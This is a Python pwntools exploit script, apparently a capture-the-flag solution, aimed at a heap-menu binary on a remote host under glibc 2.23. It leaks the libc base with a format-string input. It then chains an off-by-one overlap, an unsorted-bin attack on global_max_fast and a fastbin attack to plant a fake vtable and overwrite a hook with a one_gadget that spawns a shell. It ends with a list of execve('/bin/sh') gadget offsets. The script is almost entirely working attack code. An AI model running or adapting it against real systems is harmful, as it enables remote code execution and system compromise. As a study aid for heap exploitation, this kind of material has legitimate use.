#利用off by one创造overlap chunk，再利用unsorted attack修改global_max_fast然后fastbin attack
from pwn import *
context.log_level = 'debug'
prog = './pwn1'
elf = ELF(prog)
#p = process(prog)
libc = ELF("./libc-2.23.so")
p = remote("47.108.135.45", 20245)
def dbg():
    gdb.attach(p)
    p.interactive()

def add(idx, size, content):
	p.sendlineafter(">> ", '1')
	p.sendlineafter("to create (0-10):", str(idx))
	p.sendlineafter("size:\n", str(size))
	p.sendlineafter("content: \n", content)
def edit(idx, content):
	p.sendlineafter(">> ", '4')
	p.sendlineafter("index:\n", str(idx))
	p.sendlineafter("content: \n", content)
def free(idx):
	p.sendlineafter(">> ", '2')
	p.sendlineafter("index:\n", str(idx))
def exp():
	p.sendlineafter("Enter your name: ", "%2$p")
	p.recvuntil("0x")
	libc_base = int(p.recv(12), 16)-3958656
	log.info("libc : " + hex(libc_base))
	add(0, 0x88, 'a')
	add(1, 0x88, 'a')
	add(2, 0x88, 'a')
	add(3, 0x88, 'a')
	free(0)
	edit(1, '\x00'*0x80+p64(0x120)+'\x90')
	free(2)
	add(0, 0xb8, 'a')
	max_fast = 0x7f646a63f7f8-0x7f646a279000+libc_base
	edit(1, p64(0)*5+p64(0xf1)+p64(0)+p64(max_fast-0x10))
	add(2, 0xe8, 'a')
	free(2)
	target = libc_base + 0x7fb711c2399b-0x7fb71185f000
	edit(1, p64(0)*5+p64(0xf1)+p64(target)+p64(0))
	add(2, 0xe0, 'a')
	vtable = 0x7f75924e76e0-0x7f7592124000+libc_base
	payload = '\x00'*(5+8)+p64(vtable)
	payload = payload.ljust(0xd8, '\x00')
	payload += '\xff'
	add(4, 0xe8, payload)
	target1 = 0x7f9bd225da7b-0x7f9bd1e99000+libc_base
	free(2)
	edit(1, p64(0)*5+p64(0xf1)+p64(target1)+p64(0))
	add(2, 0xe0, 'a')
	one = libc_base+0xf1147
	realloc = libc_base+libc.sym['realloc']
	add(5, 0xe0, '\x00'*5+p64(0)*15+p64(one)+p64(realloc+8))
	p.sendlineafter(">> ", '1')
	p.sendlineafter("to create (0-10):", '6')
	p.sendlineafter("size:\n", '150')
	p.interactive()
if __name__ == '__main__':
	exp()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
